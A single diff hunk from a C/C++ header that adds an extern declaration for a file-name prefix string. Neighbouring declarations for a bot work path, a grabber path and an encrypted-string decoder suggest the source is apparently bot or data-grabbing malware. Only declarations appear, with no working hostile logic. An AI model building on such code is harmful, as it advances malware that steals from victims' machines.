@@ -33,6 +33,7 @@ string GetStr(const char* EncryptedStr);
 extern CSSTR StrBotWorkPath[];
 extern CSSTR StrGrabberPath[];
 
+extern CSSTR StrPrefixFileName[];
 
 //Не шифрованные строки и данные
 extern CSSTR Slash[];
